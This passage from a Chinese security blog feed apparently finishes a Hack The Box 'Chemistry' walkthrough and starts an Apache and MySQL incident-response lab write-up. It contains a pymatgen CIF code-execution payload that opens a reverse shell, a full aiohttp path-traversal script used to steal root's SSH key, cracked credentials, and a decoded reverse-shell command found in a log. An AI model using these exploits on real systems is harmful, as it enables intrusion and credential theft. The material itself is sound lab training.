class="hljs-keyword">performed</span>. <span class="hljs-keyword">Please</span> <span class="hljs-keyword">report</span> <span class="hljs-keyword">any</span> <span class="hljs-keyword">incorrect</span> <span class="hljs-keyword">results</span> <span class="hljs-keyword">at</span> <span class="hljs-keyword">https</span>://nmap.org/submit/ .</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">Nmap</span> <span class="hljs-keyword">done</span>: 1 <span class="hljs-keyword">IP</span> <span class="hljs-keyword">address</span> (1 <span class="hljs-keyword">host</span> <span class="hljs-keyword">up</span>) <span class="hljs-keyword">scanned</span> <span class="hljs-keyword">in</span> 154.02 <span class="hljs-keyword">seconds</span></span></span><br></code></pre></td></tr></table></figure><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs inform7">How many <span class="hljs-keyword">open</span> TCP ports <span class="hljs-keyword">are</span> listening on Chemistry?<br>:2<br></code></pre></td></tr></table></figure><h1 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h1><p>注册账号进去查看源码</p><p><img src="https://img.dkdun.cn/v1/2025/12/fa765fa0bed88a25.png"></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">What</span> is the path of the example <span class="hljs-title class_">CIF</span> file available <span class="hljs-keyword">in</span> the dashboard?<br><span class="hljs-symbol">:/static/example</span>.cif<br></code></pre></td></tr></table></figure><h1 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3"></a>Task 3</h1><p><a href="https://github.com/advisories/GHSA-vgv8-5cpj-qj2f">https://github.com/advisories/GHSA-vgv8-5cpj-qj2f</a></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> <span class="hljs-number">2024</span> CVE ID <span class="hljs-keyword">for</span> <span class="hljs-keyword">a</span> vulnerability related <span class="hljs-built_in">to</span> parsing CIF <span class="hljs-built_in">files</span> <span class="hljs-keyword">using</span> <span class="hljs-keyword">a</span> Python library?<br>:CVE<span class="hljs-number">-2024</span><span class="hljs-number">-23346</span><br></code></pre></td></tr></table></figure><h1 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h1><p>POC 改一下，尝试反弹 shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">data_5yOhtAoR<br>_audit_creation_date            <span class="hljs-number">2018</span>-06-08<br>_audit_creation_method          <span class="hljs-string">&quot;Pymatgen CIF Parser Arbitrary Code Execution Exploit&quot;</span><br><br>loop_<br>_parent_propagation_vector.<span class="hljs-built_in">id</span><br>_parent_propagation_vector.kxkykz<br>k1 [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br><br>_space_group_magn.transform_BNS_Pp_abc  <span class="hljs-string">&#x27;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[&quot;__sub&quot; + &quot;classes__&quot;]) () if d.__name__ == &quot;BuiltinImporter&quot;][0].load_module (&quot;os&quot;).system (&quot;/bin/bash -c \&#x27;sh -i &gt;&amp; /dev/tcp/10.10.16.15/1234 0&gt;&amp;1\&#x27;&quot;);0,0,0&#x27;</span><br><br><br>_space_group_magn.number_BNS  <span class="hljs-number">62.448</span><br>_space_group_magn.name_BNS  <span class="hljs-string">&quot;P  n&#x27;  m  a&#x27;  &quot;</span><br></code></pre></td></tr></table></figure><p>监听</p><p><img src="https://img.dkdun.cn/v1/2025/12/85bf413a399b1f76.png"></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What user <span class="hljs-keyword">the</span> CIF Analyzer web <span class="hljs-built_in">application</span> <span class="hljs-built_in">running</span> <span class="hljs-keyword">as</span>?<br>:app<br></code></pre></td></tr></table></figure><h1 id="Task-5"><a href="#Task-5" class="headerlink" title="Task 5"></a>Task 5</h1><p><code>instance</code> 目录下有一个 <code>database.db</code> 文件</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> name <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> sqlite database <span class="hljs-built_in">file</span> used <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> CIF analyzer web application?<br>:database.db<br></code></pre></td></tr></table></figure><h1 id="Task-6"><a href="#Task-6" class="headerlink" title="Task 6"></a>Task 6</h1><p><img src="https://img.dkdun.cn/v1/2025/12/08ffe3c1d94c3c58.png"></p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-attribute">63ed86ee9f624c7b14f1d4f43dc251a5</span>:unicorniosrosados<br></code></pre></td></tr></table></figure><p>拿到用户名和密码</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">rose:</span>unicorniosrosados<br></code></pre></td></tr></table></figure><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">What <span class="hljs-keyword">is</span> the rosa user<span class="hljs-symbol">&#x27;s</span> password <span class="hljs-keyword">on</span> Chemistry?<br>:unicorniosrosados<br></code></pre></td></tr></table></figure><h1 id="Submit-User-Flag"><a href="#Submit-User-Flag" class="headerlink" title="Submit User Flag"></a>Submit User Flag</h1><p>ssh 连接</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">Submit the flag located in the rosa user&#x27;s home directory.<br>:<span class="hljs-number">86951223</span>f53c1ebf7cf<span class="hljs-number">0107</span>fed0df534<br></code></pre></td></tr></table></figure><h1 id="Task-8"><a href="#Task-8" class="headerlink" title="Task 8"></a>Task 8</h1><p>用 <code>netstat</code> 查看一下网络状况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -ano<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/bba66c3120044f20.png"></p><p>本地有 8080 端口</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">What TCP port that <span class="hljs-keyword">is</span> listneing only on the localhost <span class="hljs-keyword">interface</span> <span class="hljs-symbol">and</span> <span class="hljs-symbol">hosting</span> <span class="hljs-symbol">a</span> <span class="hljs-symbol">webserver</span>?<br>:<span class="hljs-symbol">8080</span><br></code></pre></td></tr></table></figure><h1 id="Task-9"><a href="#Task-9" class="headerlink" title="Task 9"></a>Task 9</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">rosa@chemiscurl -I http://127.0.0.1:8080<br>HTTP/1.1 200 OK<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 5971<br>Date: Sat, 22 Mar 2025 12:13:29 GMT<br>Server: Python/3.9 aiohttp/3.9.1<br></code></pre></td></tr></table></figure><p>从 <code>curl</code> 情况发现服务器为 <code>aiohttp</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-type">name</span> <span class="hljs-keyword">of</span> the <span class="hljs-keyword">server</span> application hosting the <span class="hljs-type">internal</span> website?<br>:aiohttp<br></code></pre></td></tr></table></figure><h1 id="Task-10"><a href="#Task-10" class="headerlink" title="Task 10"></a>Task 10</h1><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What <span class="hljs-built_in">version</span> <span class="hljs-keyword">of</span> AIOHTTP <span class="hljs-keyword">is</span> <span class="hljs-built_in">running</span> <span class="hljs-keyword">on</span> TCP port <span class="hljs-number">8080</span>?<br>:<span class="hljs-number">3.9</span><span class="hljs-number">.1</span><br></code></pre></td></tr></table></figure><h1 id="Task-11"><a href="#Task-11" class="headerlink" title="Task 11"></a>Task 11</h1><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> <span class="hljs-number">2024</span> CVE ID <span class="hljs-keyword">for</span> <span class="hljs-keyword">a</span> <span class="hljs-built_in">directory</span> traversal vulnerability <span class="hljs-keyword">in</span> AIOHTTP?<br>:CVE<span class="hljs-number">-2024</span><span class="hljs-number">-23334</span><br></code></pre></td></tr></table></figure><h1 id="Submit-Root-Flag"><a href="#Submit-Root-Flag" class="headerlink" title="Submit Root Flag"></a>Submit Root Flag</h1><p>POC：<a href="https://github.com/s4botai/CVE-2024-23334-PoC">https://github.com/s4botai/CVE-2024-23334-PoC</a></p><p>通过 curl 能找到目录</p><p><img src="https://img.dkdun.cn/v1/2025/12/121a945627060caa.png"></p><p>Poc：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash </span><br><br><br><br><span class="hljs-comment">#Colours</span><br>greenColour=<span class="hljs-string">&quot;\e[0;32m\033[1m&quot;</span><br>endColour=<span class="hljs-string">&quot;\033[0m\e[0m&quot;</span><br>redColour=<span class="hljs-string">&quot;\e[0;31m\033[1m&quot;</span><br>blueColour=<span class="hljs-string">&quot;\e[0;34m\033[1m&quot;</span><br>yellowColour=<span class="hljs-string">&quot;\e[0;33m\033[1m&quot;</span><br>purpleColour=<span class="hljs-string">&quot;\e[0;35m\033[1m&quot;</span><br>turquoiseColour=<span class="hljs-string">&quot;\e[0;36m\033[1m&quot;</span><br>grayColour=<span class="hljs-string">&quot;\e[0;37m\033[1m&quot;</span><br><br><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">helpPanel</span></span>()&#123;<br><br>  <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n<span class="hljs-variable">$&#123;redColour&#125;</span>[!] Usage: $0<span class="hljs-variable">$&#123;endColour&#125;</span>&quot;</span><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">seq</span> 1 80); <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> -ne <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;redColour&#125;</span>-&quot;</span>; <span class="hljs-keyword">done</span>; <span class="hljs-built_in">echo</span> -ne <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;endColour&#125;</span>&quot;</span><br>  <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\n\t<span class="hljs-variable">$&#123;grayColour&#125;</span>[-u]<span class="hljs-variable">$&#123;endColour&#125;</span> <span class="hljs-variable">$&#123;yellowColour&#125;</span>Url to attack<span class="hljs-variable">$&#123;endColour&#125;</span>&quot;</span><br>  <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\t<span class="hljs-variable">$&#123;grayColour&#125;</span>[-f]<span class="hljs-variable">$&#123;endColour&#125;</span> <span class="hljs-variable">$&#123;yellowColour&#125;</span>File to read<span class="hljs-variable">$&#123;endColour&#125;</span>\n&quot;</span><br><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">sendPayload</span></span>()&#123;<br><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">seq</span> 1 15); <span class="hljs-keyword">do</span> <br>    <br>    string=<span class="hljs-string">&quot;../&quot;</span><br>    payload+=<span class="hljs-variable">$string</span><br>    <span class="hljs-built_in">command</span>=$(curl -s -o /dev/null --path-as-is -w %&#123;http_code&#125; <span class="hljs-string">&quot;$url$payload<span class="hljs-variable">$file</span>&quot;</span>)<br>  <br>    <span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$command</span> -eq 200 ]]; <span class="hljs-keyword">then</span><br>      <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n<span class="hljs-variable">$&#123;grayColour&#125;</span>[+]<span class="hljs-variable">$&#123;endColour&#125;</span> <span class="hljs-variable">$&#123;yellowColour&#125;</span>The payload<span class="hljs-variable">$&#123;endColour&#125;</span> <span class="hljs-variable">$&#123;greenColour&#125;</span>$url$payload$file<span class="hljs-variable">$&#123;endColour&#125;</span> <span class="hljs-variable">$&#123;yellowColour&#125;</span>returned the following content</span><br><span class="hljs-string">:\n<span class="hljs-variable">$&#123;endColour&#125;</span>&quot;</span><br>      curl -s --path-as-is $url$payload<span class="hljs-variable">$file</span><br>      <span class="hljs-built_in">break</span><br>    <span class="hljs-keyword">fi</span><br><br><br>  <span class="hljs-keyword">done</span><br>&#125;<br><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">getopts</span> <span class="hljs-string">&quot;u:f:h:&quot;</span> arg; <span class="hljs-keyword">do</span> <br><br>  <span class="hljs-keyword">case</span> <span class="hljs-variable">$arg</span> <span class="hljs-keyword">in</span><br>    u) url=<span class="hljs-variable">$OPTARG</span>; <span class="hljs-built_in">let</span> parameter_counter+=1;;<br>    f) file=<span class="hljs-variable">$OPTARG</span>; <span class="hljs-built_in">let</span> parameter_counter+=1;;<br>    h) helpPanel;;<br><br>  <span class="hljs-keyword">esac</span><br>  <br><span class="hljs-keyword">done</span><br><br><span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$parameter_counter</span> -eq 0 ]]; <span class="hljs-keyword">then</span> <br><br>  helpPanel<br><br><span class="hljs-keyword">else</span> <br><br>  sendPayload<br><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>尝试读取  <code>/etc/passwd</code> 下的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash lfi.sh -u http://localhost:8080/assets/ -f /etc/passwd<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/6f3c3381c22a1879.png"></p><p>成功了，继续读取 <code>/root/.ssh</code> 下的 root 用户的私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash lfi.sh -u http://localhost:8080/assets/ -f /root/.ssh/id_rsa<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/06289e45d91234d1.png"></p><p>拿到私钥之后创建一个存放私钥的文件 <code>id_rsa</code>，然后给予权限，用密钥登录 ssh 服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 600 id_rsa<br>ssh root@10.10.11.38 -i id_rsa<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/1d8933ef55427379.png"></p><p>拿到 root 的 flag</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-punctuation">-</span>Submit the flag located in the root user&#x27;s home directory.<br>:<span class="hljs-number">7740</span>ea93f919b1f5c96d93df2f2a44cd<br></code></pre></td></tr></table></figure><h1 id="CVE-2024-23334"><a href="#CVE-2024-23334" class="headerlink" title="CVE-2024-23334"></a>CVE-2024-23334</h1><p>详细内容：<a href="https://github.com/aio-libs/aiohttp/security/advisories/GHSA-5h86-8mv2-jq9f">https://github.com/aio-libs/aiohttp/security/advisories/GHSA-5h86-8mv2-jq9f</a></p><p>When using aiohttp as a web server and configuring static routes, it is necessary to specify the root path for static files. Additionally, the option ‘follow_symlinks’ can be used to determine whether to follow symbolic links outside the static root directory. When ‘follow_symlinks’ is set to True, there is no validation to check if a given file path is within the root directory.This can lead to directory traversal vulnerabilities, resulting in unauthorized access to arbitrary files on the system, even when symlinks are not present.</p><p>使用 aiohttp 作为 Web 服务器并配置静态路由时，需要指定静态文件的根路径。此外，选项  <code>&#39;follow_symlinks&#39;</code> 可用于确定是否遵循静态根目录之外的符号链接。当 <code>&#39;follow_symlinks&#39;</code>  设置为 True 时，不会进行验证来检查给定的文件路径是否在根目录中。这可能导致目录遍历漏洞，导致未经授权访问系统上的任意文件，即使符号链接不存在也是如此。</p><p>比如这个例子</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.<span class="hljs-property">router</span>.<span class="hljs-title function_">add_routes</span>([<br>    web.<span class="hljs-title function_">static</span>(<span class="hljs-string">&quot;/static&quot;</span>, <span class="hljs-string">&quot;static/&quot;</span>, follow_symlinks=<span class="hljs-title class_">True</span>),  # <span class="hljs-title class_">Remove</span> follow_symlinks to avoid the vulnerability<br>])<br></code></pre></td></tr></table></figure><p>里面的 <code>follow_symlinks=True</code> 会导致目录遍历产生任意文件读取</p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB 渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>玄机-第二章</title>
    <link href="/2025/03/20/%E7%8E%84%E6%9C%BA-%E7%AC%AC%E4%BA%8C%E7%AB%A0/"/>
    <url>/2025/03/20/%E7%8E%84%E6%9C%BA-%E7%AC%AC%E4%BA%8C%E7%AB%A0/</url>
    
    <content type="html"><![CDATA[<p>apache 日志分析 &amp; mysql 应急响应 &amp; redis 应急响应</p><span id="more"></span><h1 id="apache-日志分析"><a href="#apache-日志分析" class="headerlink" title="apache 日志分析"></a>apache 日志分析</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">账号密码 root apacherizhi<br>ssh root@<span class="hljs-built_in">IP</span><br><span class="hljs-number">1</span>、提交当天访问次数最多的<span class="hljs-built_in">IP</span>，即黑客<span class="hljs-built_in">IP</span>：<br><span class="hljs-number">2</span>、黑客使用的浏览器指纹是什么，提交指纹的md5：<br><span class="hljs-number">3</span>、查看包含index<span class="hljs-number">.</span>php页面被访问的次数，提交次数：<br><span class="hljs-number">4</span>、查看黑客<span class="hljs-built_in">IP</span>访问了多少次，提交次数：<br><span class="hljs-number">5</span>、查看<span class="hljs-number">2023</span>年<span class="hljs-number">8</span>月<span class="hljs-number">03</span>日<span class="hljs-number">8</span>时这一个小时内有多少<span class="hljs-built_in">IP</span>访问，提交次数:<br></code></pre></td></tr></table></figure><h2 id="Q1"><a href="#Q1" class="headerlink" title="Q1"></a>Q1</h2><p>在 apache2 日志中过滤出访问次数最多的 IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cut</span> -d- -f 1 access.log.1 | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -rn<br><br><span class="hljs-comment"># cut:从每行中提取指定字段</span><br><span class="hljs-comment"># -d-:指定分隔符为 -</span><br><span class="hljs-comment"># -f 1:指定要提取第一个字段</span><br><span class="hljs-comment"># uniq -c:删除重复的行，只统计唯一出现的次数</span><br><span class="hljs-comment"># sort:对输出内容排序</span><br><span class="hljs-comment"># -r:按照降序排列</span><br><span class="hljs-comment"># -n:按照数值大小排序</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/005c5ee5274ca0e8.png"></p><p>拿到 IP</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.200.2</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q2"><a href="#Q2" class="headerlink" title="Q2"></a>Q2</h2><p>知道 IP 了，直接过滤出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access.log.1 | grep 192.168.200.2<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/aa8d17cf8a9d9a44.png"></p><p>找到指纹</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&quot;</span><br></code></pre></td></tr></table></figure><p>md5 加密</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">2</span>d6330f380f44ac20f3a02eed0958f66&#125;<br></code></pre></td></tr></table></figure><h2 id="Q3"><a href="#Q3" class="headerlink" title="Q3"></a>Q3</h2><p>同理，过滤出 <code>index.php</code> 文件，<code>wc -l</code>列出次数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access.log.1 | grep <span class="hljs-string">&quot;/index.php&quot;</span> | <span class="hljs-built_in">wc</span> -l<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">27</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q4"><a href="#Q4" class="headerlink" title="Q4"></a>Q4</h2><p>按照 IP  过滤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep <span class="hljs-string">&quot;192.168.200.2&quot;</span> access.log.1 | <span class="hljs-built_in">cut</span> -d<span class="hljs-string">&#x27; &#x27;</span> -f1 | <span class="hljs-built_in">sort</span> -n | <span class="hljs-built_in">uniq</span> -c<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/b7f23942d9639a77.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">6555</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q5"><a href="#Q5" class="headerlink" title="Q5"></a>Q5</h2><p>按照时间过滤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep <span class="hljs-string">&quot;03/Aug/2023:08&quot;</span> access.log.1 | <span class="hljs-built_in">cut</span> -d<span class="hljs-string">&#x27; &#x27;</span> -f1 | <span class="hljs-built_in">sort</span> -n | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">wc</span> -l<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/5a6b47c2b00b4c78.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">5</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="mysql-应急响应"><a href="#mysql-应急响应" class="headerlink" title="mysql 应急响应"></a>mysql 应急响应</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">mysql应急响应 ssh账号 root  密码 xjmysql<br>ssh env<span class="hljs-selector-class">.xj</span><span class="hljs-selector-class">.edisec</span><span class="hljs-selector-class">.net</span>  -<span class="hljs-selector-tag">p</span> xxxxx<br><span class="hljs-number">1</span>.黑客第一次写入的shell flag&#123;关键字符串&#125; <br><span class="hljs-number">2</span>.黑客反弹shell的ip flag&#123;ip&#125;<br><span class="hljs-number">3</span>.黑客提权文件的完整路径 md5 flag&#123;md5&#125; 注 /xxx/xxx/xxx/xxx/xxx<span class="hljs-selector-class">.xx</span><br><span class="hljs-number">4</span>.黑客获取的权限 flag&#123;whoami后的值&#125;<br></code></pre></td></tr></table></figure><h2 id="Q1-1"><a href="#Q1-1" class="headerlink" title="Q1"></a>Q1</h2><p>写入的 shell 一般在 web 目录下，所以进入 <code>/var/www/html</code> 查看，查看可疑文件 <code>sh.php</code> </p><p><img src="https://img.dkdun.cn/v1/2025/12/7c6078e78f8d08c6.png"></p><p>找到 flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;ccfda79e-<span class="hljs-number">7</span>aa1-<span class="hljs-number">4275</span>-bc26-a6189eb9a20b&#125;<br></code></pre></td></tr></table></figure><p>而且可以发现注入点为数据库表的第三个字段</p><h2 id="Q2-1"><a href="#Q2-1" class="headerlink" title="Q2"></a>Q2</h2><p>反弹 shell 可以看日志，进入 <code>/var/log</code> 目录下看日志，进入 <code>apache2</code> 查看 <code>access.log</code>，能看见如下一条日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">192.168.200.2 - - [01/Aug/2023:02:18:18 +0000] &quot;POST /adminer.php?username=root&amp;sql=select%20sys_eval(%27echo%20YmFzaCAtaSA%2BJi9kZXYvdGNwLzE5Mi4xNjguMTAwLjEzLzc3NyAwPiYx%7Cbase64%20-d%27)%3B HTTP/1.1&quot; 200 4025 &quot;http://192.168.200.31:8005/adminer.php?username=root&amp;sql=select%20sys_eval(%27ls%20-la%20%2Ftmp%2F%27)%3B&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&quot;<br></code></pre></td></tr></table></figure><p>url 解码之后得到</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;echo YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguMTAwLjEzLzc3NyAwPiYx|base64 -d&#x27;</span>);<br></code></pre></td></tr></table></figure><p>base64 解码得到反弹 shell 语句</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">bash -i &gt;&amp;/dev/tcp/192.168.100.13/777 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p>拿到 flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.100.13</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q3-1"><a 